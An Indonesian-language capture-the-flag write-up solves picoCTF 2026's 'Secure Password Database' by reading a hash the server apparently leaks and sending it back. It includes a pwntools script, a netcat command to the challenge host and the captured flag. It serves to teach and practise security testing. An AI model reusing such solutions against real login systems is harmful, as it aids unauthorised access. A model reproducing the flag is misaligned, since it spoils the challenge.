# Secure Password Database — picoCTF 2026 Writeup

**Category:** Binary Exploitation / Reverse Engineering  
**Challenge:** Secure Password Database  
**Author:** Philip Thayer  
**Event:** picoCTF 2026

---

## Deskripsi Soal

> *"I made a new password authentication program that even shows you the password you entered saved in the database! Isn't that cool?"*

Server meminta kita membuat password, lalu menampilkan representasi bytes-nya yang tersimpan di "database". Setelah itu, server meminta kita memasukkan **hash** yang sesuai untuk mengakses akun. Jika hash cocok, flag diberikan.

Tujuan: pahami bagaimana server menghitung hash dari password, lalu masukkan nilai yang tepat untuk lolos autentikasi.

---

## Observasi

Dari interaksi dengan server:

```
Please set a password for your account:
AAAA
How many bytes in length is your password?
4
You entered: 4
Your successfully stored password:
65 65 65 65 10
Enter your hash to access your account!
15237662580160011234
picoCTF{d0nt_trust_us3rs}
```

Beberapa hal yang bisa diperhatikan:

1. Password `AAAA` (4 byte) tersimpan sebagai `65 65 65 65 10` — ada **byte tambahan `10` (newline `\n`)** di akhir yang ikut dihitung
2. Server menampilkan nilai hash `15237662580160011234` **sebelum** meminta kita memasukkannya — ini adalah **information disclosure**
3. Flag langsung muncul setelah kita kirimkan hash tersebut kembali

---

## Vulnerabilitas

### 1. Hash Ditampilkan ke User (Information Disclosure)

Server mencetak nilai hash ke stdout sebelum meminta user memasukkannya sebagai bukti autentikasi. Cukup **salin nilai hash yang sudah diberikan server** dan kirimkan kembali — tidak perlu menghitung apapun.

### 2. Newline Ikut Masuk ke Buffer Password

Server membaca input dengan fungsi yang menyertakan karakter newline `\n` (byte `0x0A` = `10`) ke dalam buffer. Password yang tersimpan selalu **1 byte lebih panjang** dari yang dimasukkan pengguna. Ini hints dari judul soal — "shows you the password saved in the database" — karena yang tampil bukan hanya password asli, tapi termasuk newline-nya.

### 3. Validasi Trivial

Server hanya mencocokkan hash yang baru saja dicomputenya sendiri dengan input kita. Karena hash sudah ditampilkan, autentikasi ini tidak memberikan perlindungan apapun.

---

## Strategi Exploit

### Step 1 — Kirim Password Sembarang

Masukkan password apapun:

```
Please set a password for your account:
AAAA
```

### Step 2 — Konfirmasi Panjang Password

```
How many bytes in length is your password?
4
```

### Step 3 — Baca Hash yang Ditampilkan Server

Server mencetak hash dari password yang disimpan. **Catat nilai ini:**

```
Your successfully stored password:
65 65 65 65 10
Enter your hash to access your account!
15237662580160011234   ← salin nilai ini
```

### Step 4 — Kirim Hash Kembali

```
15237662580160011234
```

Server langsung memberikan flag.

---

## Cara Pakai

### Manual (Netcat)

```bash
nc candy-mountain.picoctf.net 61872
```

Ikuti langkah-langkah di atas secara manual.

### Otomatis (pwntools)

```python
from pwn import *

io = remote("candy-mountain.picoctf.net", 61872)

io.sendlineafter(b"account:\n", b"AAAA")
io.sendlineafter(b"password?\n", b"4")

io.recvuntil(b"Enter your hash to access your account!\n")
hash_val = io.recvline().strip()
print(f"[*] Hash: {hash_val.decode()}")

io.sendline(hash_val)
print(io.recvall().decode())
```

---

## Contoh Output

```
[*] Hash: 15237662580160011234
picoCTF{d0nt_trust_us3rs}
```

---

## Requirements

| Tool | Fungsi |
|---|---|
| `netcat` | Koneksi manual ke server |
| `pwntools` | Otomasi interaksi dengan server |

---

## Catatan

> ℹ️ Byte `10` (newline `\n`) yang ikut tersimpan adalah artefak dari `fgets()` di C yang tidak membuang karakter `\n` — ini yang dimaksud "shows you the password saved in the database" di deskripsi soal.

> ⚠️ Nama challenge *"Secure Password Database"* adalah ironi penuh — server membocorkan hash-nya sendiri lalu meminta kita memasukkannya kembali sebagai "autentikasi".

> ℹ️ Algoritma hash yang digunakan server tidak perlu diketahui sama sekali karena nilai hash sudah diberikan secara cuma-cuma.